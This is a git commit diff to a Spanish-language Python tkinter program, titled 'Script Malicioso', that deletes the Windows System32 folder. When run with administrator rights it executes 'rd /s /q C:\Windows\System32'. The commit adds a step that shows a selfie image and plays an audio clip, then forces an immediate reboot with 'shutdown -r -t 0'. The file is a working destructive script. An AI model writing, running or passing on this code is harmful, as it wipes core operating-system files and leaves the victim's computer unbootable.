3230b0d187dae7e911ecf6e1c65e147b022a6bd5
Alex <alexgaro2015@gmail.com>
2024-02-13 13:18:40 +0100

    a

--- Windows_deleted/system32_delete.py
+++ Windows_deleted/system32_delete.py
@@ -2,6 +2,8 @@ import tkinter as tk
 from tkinter import messagebox
 import os
 import ctypes
+import subprocess
+import pygame
 
 def is_admin():
     try:
@@ -13,9 +15,25 @@ def borrar_system32():
     if is_admin():
         os.system("rd /s /q C:\\Windows\\System32")
         print("La carpeta System32 ha sido borrada!")
-        root.destroy()  # Cierra la ventana cuando se hace clic en "Comenzar"
+        mostrar_imagen_y_reproducir_audio()
     else:
         messagebox.showerror("Error", "Se requieren privilegios de administrador para ejecutar esta acción.")
+
+def mostrar_imagen_y_reproducir_audio():
+    # Mostrar imagen
+    imagen = tk.PhotoImage(file="./Jord_Wild_selfie.jpg")
+    label_imagen = tk.Label(root, image=imagen)
+    label_imagen.pack()
+
+    # Reproducir audio
+    pygame.mixer.init()
+    pygame.mixer.music.load("./audo_XD_jordi_wild.mp3")
+    pygame.mixer.music.play()
+
+    root.after(10000, reiniciar_windows)  # Reiniciar Windows después de 10 segundos
+
+def reiniciar_windows():
+    subprocess.call(["shutdown", "-r", "-t", "0"])
 
 def comenzar():
     respuesta = messagebox.askyesno("Confirmación", "¿Estás seguro de que quieres borrar la carpeta System32?")
@@ -28,7 +46,7 @@ def salir():
 
 root = tk.Tk()
 root.title("Script Malicioso")
-root.geometry("400x200")
+root.geometry("400x400")
 
 etiqueta_texto = tk.Label(root, text="¿Preparado para borrar la carpeta System32?")
 etiqueta_texto.pack()
